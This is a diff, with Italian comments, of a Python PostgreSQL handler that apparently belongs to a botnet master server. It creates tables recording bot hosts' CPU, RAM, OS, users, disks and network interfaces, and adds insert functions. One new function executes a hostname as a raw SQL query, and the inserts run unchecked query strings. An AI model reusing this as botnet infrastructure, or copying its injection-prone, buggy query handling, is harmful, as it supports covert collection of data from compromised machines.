@@ -23,7 +23,10 @@ class DatabaseHandler:
 
     # TODO: Controllare che la dimensione fissata dei campi delle tabelle sono sufficienti (Sono le 3 e non ho la minima voglia di controllare @francywolf)
     # TODO: Controllare che sia necessario definire i campi delle tabelle NOT NULL (Sono le 3 e non ho la minima voglia di controllare @francywolf). Io rn: https://www.youtube.com/watch?v=5IZ_POEeiAA
-    __botclient_table_definition = "CREATE TABLE IF NOT EXISTS  botclient (ID INT PRIMARY KEY NOT NULL, HOSTNAME VARCHAR(50) NOT NULL);"
+    """
+    La PRIMARY KEY è definita come SERIAL in modo da poter essere automaticamente autoincrementabile (Nella query non siamo obbligati a passare il campo ID)
+    """
+    __botclient_table_definition = "CREATE TABLE IF NOT EXISTS  botclient (ID SERIAL PRIMARY KEY NOT NULL, HOSTNAME VARCHAR(50) NOT NULL);"
 
     __botclient_cpu_informations = """CREATE TABLE IF NOT EXISTS cpu_informations
                                       (CPU_ID INT PRIMARY KEY NOT NULL, BOTCLIENT_CPU_ID INT NOT NULL, BRAND VARCHAR(100), CPU_COUNT VARCHAR(100),
@@ -57,11 +60,15 @@ class DatabaseHandler:
                                            INTERFACE VARCHAR(30), IP VARCHAR(40), NETMASK VARCHAR(40), BROADCAST_IP VARCHAR(50),
                                            CONSTRAINT botnet_network_fk FOREIGN KEY(BOTCLIENT_NETWORK_ID) REFERENCES botclient(ID));'''
 
-    # TODO: Sostituire con un dictionary (Mi piace di più)
-    __invoke_all = [__botclient_table_definition, __botclient_cpu_informations,
-                    __botclient_ram_informations, __botclient_os_informations,
-                    __botclient_users_informations, __botclient_disk_io_counter_informations,
-                    __botclient_disk_partitions_informations, __botclient_network_informations]
+    # Utilizziamo un dictionary per avere una informazione più chiara dell'operazione che il server sta eseguendo (creazione della tabella X corrispondente a una key all'interno di __invoke_all)
+    __invoke_all = {"botclient": __botclient_table_definition,
+                    "cpu_informations": __botclient_cpu_informations,
+                    "disk_io_counters_informations": __botclient_disk_io_counter_informations,
+                    "disk_partitions_informations": __botclient_disk_partitions_informations,
+                    "network_informations": __botclient_network_informations,
+                    "os_informations": __botclient_os_informations,
+                    "ram_informations": __botclient_ram_informations,
+                    "user_informations": __botclient_users_informations}
 
     def database_init(db_host: str, db_port: int, db_name: str, db_username: str, db_password: str) -> None:
         """Funzione di setup del database."""
@@ -73,10 +80,10 @@ class DatabaseHandler:
             # Creazione di un cursore per effettuare operazioni
             cursor = connection.cursor()
 
-            # Per brevità all'avvio le eseguiamo tutte con un ciclo (evitiamo di avere codice ripetitivo sfruttando una lista che contenga tutte le query)
-            for x in range(len(DatabaseHandler.__invoke_all)):
-                cursor.execute(DatabaseHandler.__invoke_all[x])
-                bot_master_utils.info(f"[+] Creazione della tabella {DatabaseHandler.__invoke_all[x]} avvenuta con successo", 1)
+            # Per brevità all'avvio le eseguiamo tutte con un ciclo (evitiamo di avere codice ripetitivo sfruttando un dictionary che contenga tutte le query)
+            for key in DatabaseHandler.__invoke_all:
+                cursor.execute(DatabaseHandler.__invoke_all[key])
+                bot_master_utils.info(f"[+] Creazione della tabella {key} avvenuta con successo", 1)
             connection.commit()
 
         except (Exception, Error) as error:
@@ -91,6 +98,39 @@ class DatabaseHandler:
 
     def database_insert(query: str) -> None:
         """Funzione di inserimento di un record nel database."""
+        bot_master_utils.info("[+] Inserimento dati nel database in corso", 2)
+        try:
+            with psycopg2.connect(host=DatabaseHandler.__database_host, port=DatabaseHandler.__database_port,
+                                  database=DatabaseHandler.__database_name, user=DatabaseHandler.__database_username,
+                                  password=DatabaseHandler.__database_password) as connection:
+                with connection.cursor() as cursor:
+                    cursor.execute(query)
+                    connection.commit()
+        except Error as e:
+            bot_master_utils.info(f"Errore nell'esecuzione dello statement: {e}", 2)
+        finally:
+            if (connection):
+                cursor.close()
+                connection.close()
+                bot_master_utils.info("[+] Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
+
+    def database_insert_new_client(hostname: str) -> None:
+        """Funzione di inserimento di un nuovo client all'interno del dbms."""
+        bot_master_utils.info("[+] Inserimento di un nuovo client nel database in corso", 2)
+        try:
+            with psycopg2.connect(host=DatabaseHandler.__database_host, port=DatabaseHandler.__database_port,
+                                  database=DatabaseHandler.__database_name, user=DatabaseHandler.__database_username,
+                                  password=DatabaseHandler.__database_password) as connection:
+                with connection.cursor() as cursor:
+                    cursor.execute(hostname)
+                    connection.commit()
+        except Error as e:
+            bot_master_utils.info(f"Errore nell'esecuzione dello statement: {e}", 2)
+        finally:
+            if (connection):
+                cursor.close()
+                connection.close()
+                bot_master_utils.info("[+] Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
 
     def database_select(query: str):
         """Funzione di retrieval di tutti i record presenti nel database."""
